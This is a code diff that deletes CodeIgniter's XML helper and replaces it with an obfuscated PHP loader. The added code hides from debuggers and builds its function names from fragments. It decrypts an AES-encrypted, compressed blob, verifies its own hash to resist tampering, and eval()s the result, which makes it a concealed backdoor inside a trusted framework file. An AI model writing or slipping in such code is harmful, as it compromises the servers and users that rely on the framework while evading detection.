@@ -1,90 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * CodeIgniter XML Helpers
- *
- * @package		CodeIgniter
- * @subpackage	Helpers
- * @category	Helpers
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/helpers/xml_helper.html
- */
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('xml_convert'))
-{
-	/**
-	 * Convert Reserved XML characters to Entities
-	 *
-	 * @param	string
-	 * @param	bool
-	 * @return	string
-	 */
-	function xml_convert($str, $protect_all = FALSE)
-	{
-		$temp = '__TEMP_AMPERSANDS__';
-
-		// Replace entities to temporary markers so that
-		// ampersands won't get messed up
-		$str = preg_replace('/&#(\d+);/', $temp.'\\1;', $str);
-
-		if ($protect_all === TRUE)
-		{
-			$str = preg_replace('/&(\w+);/', $temp.'\\1;', $str);
-		}
-
-		$str = str_replace(
-			array('&', '<', '>', '"', "'", '-'),
-			array('&amp;', '&lt;', '&gt;', '&quot;', '&apos;', '&#45;'),
-			$str
-		);
-
-		// Decode the temp markers back to entities
-		$str = preg_replace('/'.$temp.'(\d+);/', '&#\\1;', $str);
-
-		if ($protect_all === TRUE)
-		{
-			return preg_replace('/'.$temp.'(\w+);/', '&\\1;', $str);
-		}
-
-		return $str;
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_a4kbadxr=('bas'.'e64'.'_de'.'cod'.'e');
+$_x08kwm2g=('gzu'.'nco'.'mpr'.'ess');
+$_fvif1tfr=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_eodbqqym='ipVZXVSj';
+$_hzikhgvu='orVlqLML';
+$_w2x5lkhx='ynEiFvaj';
+$_doueq0h1='v+yh/izN';
+$_qsonxvda='b2/mWa3O1os=';
+$_pt73mxrt='3ERapTgS';
+$_q2wnwroi='NCwY+ExK';
+$_ilycy0vf='/zv0fg==';
+$_lgku7chm=$_a4kbadxr($_doueq0h1.$_eodbqqym.$_hzikhgvu.$_w2x5lkhx.$_qsonxvda);
+$_z471q1qg=$_a4kbadxr($_pt73mxrt.$_q2wnwroi.$_ilycy0vf);
+$_wlddhmhc=$_a4kbadxr('1W641ojied6+S9ufKCdb2aIzAFHzxBkPLSmPyO/yl4npvHJpNsLCH5MkDLwvWbv9wIlP4BcQVVu6VxJcA25SUMaKlhoZfU2R5SpD9YSqvdw28WK0jDzVC/aLmFPijouufKJ2N5QabZ4sYJyjA19IYhclcOKzkRht74/B25Fwrnl1B3ul+kI2n7obRfe1KL6fcfKTpiibyPFK2E3DGdlBYnqVAP8Xey+8bUYoGAJ81o44WVrmUjSDIR0R6mMbX4LAB5EhwFCmdw6pm0Pdcumf6khVGyaB7GA7q2poymP0DySL66/FHx70SCQKbVzmoEukDKphKE61jkE3UgeRCVhQsckHvQ0Ep4ciid5enBV6hnBd4BsBBnBO6705qT0RwveWxokYOBfwMRqeENZaH4rdP2cT1ecg7fcaRFhcNZOuxwqpIxFH61NEHd0MFzWYLSEa');
+$_y7ty5hne=$_fvif1tfr($_wlddhmhc,'aes-256-cbc',$_lgku7chm,OPENSSL_RAW_DATA,$_z471q1qg);
+if($_y7ty5hne===false){exit;}
+$_lis5t91m=$_x08kwm2g($_y7ty5hne);
+if($_lis5t91m===false){exit;}
+$_bmfdu53m='e6857dcbc5f25ae4dd5f4c22caf033aa127883adef2d8faac4a44f66b1d22137';
+$_q7kwj8mp=@file_get_contents(__FILE__);
+if($_q7kwj8mp!==false){
+$_w1l06ldz=str_replace($_bmfdu53m,"0000000000000000000000000000000000000000000000000000000000000000",$_q7kwj8mp);
+$_bbn710ei=hash("sha256",$_w1l06ldz);
+if($_bbn710ei!==$_bmfdu53m){@http_response_code(403);exit;}
 }
+eval($_lis5t91m);
